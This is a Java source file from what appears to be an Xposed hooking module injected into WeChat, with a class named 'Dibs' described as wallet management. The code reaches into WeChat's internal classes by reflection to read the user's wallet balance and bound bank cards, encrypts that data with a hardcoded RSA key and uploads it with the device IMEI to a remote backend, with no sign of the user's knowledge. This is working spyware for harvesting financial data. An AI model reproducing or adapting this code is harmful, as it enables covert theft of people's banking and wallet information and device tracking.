package com.gentcent.wechat.zzk.model.wallet;

import android.os.Looper;

import com.blankj.utilcode.util.EncodeUtils;
import com.blankj.utilcode.util.EncryptUtils;
import com.blankj.utilcode.util.PhoneUtils;
import com.gentcent.wechat.zzk.MainManager;
import com.gentcent.wechat.zzk.util.GsonUtils;
import com.gentcent.wechat.zzk.util.ThreadPoolUtils;
import com.gentcent.wechat.zzk.background.UploadUtil;
import com.gentcent.wechat.zzk.util.XLog;
import com.gentcent.wechat.zzk.model.wallet.bean.EnWalletBean;
import com.gentcent.wechat.zzk.model.wallet.bean.WalletBean;
import com.gentcent.zzk.xped.XposedHelpers;
import com.gentcent.zzk.xped.callbacks.XC_LoadPackage.LoadPackageParam;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.TimeUnit;

import sun.misc.BASE64Encoder;

/**
 * 钱包管理
 */
public class Dibs {
	private static final String TAG = "MyDibs:  ";
	public static boolean flag = false;
	public static boolean reflag = false;
	
	public static void requestDataCallback(final LoadPackageParam lpparam, boolean z) {
		XLog.d("requestDataCallback in");
		if (flag) {
			flag = false;
			if (z) {
				ThreadPoolUtils.getInstance().a(new Runnable() {
					public void run() {
						Dibs.sendWalletInfo(lpparam);
						XLog.d(TAG + " requestDataCallback money :");
						double dibs = Dibs.getDibs(MainManager.wxLpparam);
						XLog.d(TAG + "ddd :" + dibs);
					}
				}, 1000, TimeUnit.MILLISECONDS);
				return;
			}
			WalletBean walletBean = new WalletBean();
			walletBean.cards = Bankcard.getBankcards(lpparam);
			walletBean.Dibs = -1.0d;
			List<String> c = c(GsonUtils.GsonString(walletBean));
			EnWalletBean enWalletBean = new EnWalletBean();
			enWalletBean.Contents = c;
			enWalletBean.Imei = PhoneUtils.getIMEI();
			UploadUtil.sendToBack(enWalletBean);
		}
	}
	
	public static List<String> c(String walletBeanJson) {
		String str2 = "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDkn2nxgBbMHe76fIDy1gngkbGNnLi7dA1O3oM3dMv8Z8Tf/6cwoSaQ1vJ9bZ8xkEOo+CEOe5NCXqDtEEyWmjK+eVgQKpWlwnclHNe2YjFjEp259W8M+JwQCBUv4r7Z9RPVqkmf2XD51Qf4kbK+6aT/DifWTPskZqyrJl9c9xXUUQIDAQAB";
		int length = (walletBeanJson.length() / 50) + (walletBeanJson.length() % 50 != 0 ? 1 : 0);
		if (length == 0) {
			return null;
		}
		ArrayList arrayList = new ArrayList();
		for (int i = 0; i < length; i++) {
			if (i == length - 1) {
				arrayList.add(new BASE64Encoder().encode(EncryptUtils.encryptRSA(walletBeanJson.substring(i * 50, walletBeanJson.length()).getBytes(), EncodeUtils.base64Decode(str2.getBytes()), true, "RSA/ECB/PKCS1Padding")));
			} else {
				arrayList.add(new BASE64Encoder().encode(EncryptUtils.encryptRSA(walletBeanJson.substring(i * 50, (i + 1) * 50).getBytes(), EncodeUtils.base64Decode(str2.getBytes()), true, "RSA/ECB/PKCS1Padding")));
			}
		}
		return arrayList;
	}
	
	public static void requestDataIsRe(LoadPackageParam loadPackageParam, boolean z) {
		requestData(loadPackageParam, z);
	}
	
	public static void requestData(final LoadPackageParam loadPackageParam, boolean z) {
		XLog.d("requestData  联网请求函数");
		flag = true;
		try {
			Object newInstance = XposedHelpers.newInstance(loadPackageParam.classLoader.loadClass("com.tencent.mm.g.a.vj"));
			Object objectField = XposedHelpers.getObjectField(newInstance, "dfn");
			XposedHelpers.setIntField(objectField, "scene", 1);
			XposedHelpers.setBooleanField(objectField, "dfp", true);
			XposedHelpers.setBooleanField(objectField, "dfq", true);
			final Object objectField2 = XposedHelpers.getObjectField(newInstance, "dfo");
			XposedHelpers.setObjectField(objectField2, "dfg", new Runnable() {
				public void run() {
					int errCode = XposedHelpers.getIntField(objectField2, "errCode");
					if (errCode == 0) {
						Dibs.requestDataCallback(loadPackageParam, true);
					} else {
						Dibs.requestDataCallback(loadPackageParam, false);
					}
				}
			});
			XposedHelpers.callMethod(XposedHelpers.getStaticObjectField(loadPackageParam.classLoader.loadClass("com.tencent.mm.sdk.b.a"), "yVI"), "a", newInstance, Looper.myLooper());
		} catch (Throwable th) {
			if (z) {
				StringBuilder sb = new StringBuilder();
				sb.append("requestData error:");
				sb.append(th.getMessage());
				XLog.d(TAG + sb.toString());
				WalletBean walletBean = new WalletBean();
				walletBean.cards = Bankcard.getBankcards(loadPackageParam);
				StringBuilder sb2 = new StringBuilder();
				sb2.append(" requestDataCallback error  cards :");
				sb2.append(GsonUtils.GsonString(walletBean.cards));
				XLog.d(TAG + sb2.toString());
				walletBean.Dibs = -1.0d;
				StringBuilder sb3 = new StringBuilder();
				sb3.append("requestDataCallback error walletBean :");
				sb3.append(GsonUtils.GsonString(walletBean));
				XLog.d(TAG + sb3.toString());
				List<String> c = c(GsonUtils.GsonString(walletBean));
				EnWalletBean enWalletBean = new EnWalletBean();
				enWalletBean.Contents = c;
				enWalletBean.Imei = PhoneUtils.getIMEI();
				UploadUtil.sendToBack(enWalletBean);
				th.printStackTrace();
			}
		}
	}
	
	/* access modifiers changed from: private */
	public static void sendWalletInfo(LoadPackageParam loadPackageParam) {
		WalletBean walletBean = new WalletBean();
		walletBean.cards = Bankcard.getBankcards(loadPackageParam);
		StringBuilder sb = new StringBuilder();
		sb.append(" requestDataCallback  cards :");
		sb.append(GsonUtils.GsonString(walletBean.cards));
		XLog.d(TAG + sb.toString());
		double dibs = getDibs(loadPackageParam);
		walletBean.Dibs = dibs;
		XLog.d(TAG + "requestDataCallback  walletBean :" + GsonUtils.GsonString(walletBean));
		List<String> c = c(GsonUtils.GsonString(walletBean));
		EnWalletBean enWalletBean = new EnWalletBean();
		enWalletBean.Contents = c;
		enWalletBean.Imei = PhoneUtils.getIMEI();
		UploadUtil.sendToBack(enWalletBean);
		XLog.d(TAG + "sendWalletInfo money :" + dibs);
	}
	
	public static double getDibs(LoadPackageParam loadPackageParam) {
		try {
			Object objectField = XposedHelpers.getObjectField(XposedHelpers.callStaticMethod(loadPackageParam.classLoader.loadClass("com.tencent.mm.plugin.wallet_core.model.q"), "cKk"), "sRV");
			if (objectField != null) {
				double longField = (double) XposedHelpers.getLongField(objectField, "field_wallet_balance");
				if (longField > 0.0d) {
					Double.isNaN(longField);
					return longField / 100.0d;
				}
			} else {
				XLog.d(TAG + "getDibs  card is null:");
			}
		} catch (Exception e) {
			StringBuilder sb = new StringBuilder();
			sb.append("getDibs  e:");
			sb.append(e.getMessage());
			XLog.d(TAG + sb.toString());
			e.printStackTrace();
		}
		return 0.0d;
	}
}
